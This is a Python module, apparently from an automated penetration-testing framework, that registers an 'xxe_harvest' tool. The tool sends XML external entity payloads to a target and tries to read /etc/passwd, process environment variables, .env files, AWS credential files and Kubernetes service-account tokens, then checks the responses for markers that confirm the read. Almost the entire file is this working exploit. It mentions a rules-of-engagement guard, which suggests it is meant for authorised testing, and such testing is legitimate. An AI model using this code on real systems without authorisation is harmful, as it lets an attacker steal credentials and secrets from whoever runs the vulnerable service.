from __future__ import annotations

from .chain_engine import register_tool
from .config import load_engine
from . import http as _http


_PAYLOAD = ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://{path}">]>'
            '<root>&xxe;</root>')

_TARGET_FILES = [
    "/etc/passwd",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "app/.env",
    "/app/.env",
    "/var/www/html/.env",
    "app/config/database.yml",
    "/.aws/credentials",
    "/root/.aws/credentials",
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
]

_MARKERS = {
    "/etc/passwd": "root:",
    "/etc/hostname": "",
    "/proc/self/environ": "PATH=",
    "/proc/self/cmdline": "",
    "app/.env": "APP_KEY",
    "/app/.env": "APP_KEY",
    "/var/www/html/.env": "APP_KEY",
    "app/config/database.yml": "password",
    "/.aws/credentials": "aws_access_key_id",
    "/root/.aws/credentials": "aws_access_key_id",
    "/var/run/secrets/kubernetes.io/serviceaccount/token": "eyJ",
}


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _post_xml(url, payload, headers, timeout, verify, roe_guard):
    h = dict(headers or {})
    h.setdefault("Content-Type", "application/xml")
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            r = c.post(url, content=payload.encode("utf-8"), headers=h)
        return {"status": r.status_code, "body": (r.text or "")[:8000]}
    except _http.ROEBlock as e:
        return {"status": None, "error": "ROE_BLOCK: " + str(e)}
    except _http.TimeoutException:
        return {"status": None, "error": "timeout"}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {e}"}


def _tool_xxe_harvest(orch, args):
    url = args.get("url") or orch.target
    headers = args.get("headers") or {}
    verify = _verify_tls()
    roe_guard = getattr(orch, "roe_guard", None)

    files_read = []
    attempts = []
    for path in _TARGET_FILES:
        payload = _PAYLOAD.format(path=path)
        r = _post_xml(url, payload, headers, 10, verify, roe_guard)
        attempts.append({"path": path, "status": r.get("status"),
                         "error": r.get("error")})
        body = r.get("body") or ""
        marker = _MARKERS.get(path, "")
        if marker and marker in body:
            files_read.append(path)
            continue
        if path in ("/etc/hostname", "/proc/self/cmdline"):
            if body and r.get("status") == 200 and len(body) < 500:
                files_read.append(path)
                continue

    if files_read:
        return {
            "verdict": "VULNERABLE",
            "reason": f"XXE file read confirmed on {len(files_read)} path(s): "
                      + ", ".join(files_read[:3]),
            "evidence": {"files_read": files_read, "attempts": attempts},
        }
    if any(a.get("status") is not None for a in attempts):
        return {"verdict": "PASS",
                "reason": "XML parsed but no file markers returned",
                "evidence": {"attempts": attempts}}
    return {"verdict": "UNKNOWN",
            "reason": "all XXE payloads failed to reach the target",
            "evidence": {"attempts": attempts}}


register_tool("xxe_harvest", _tool_xxe_harvest)
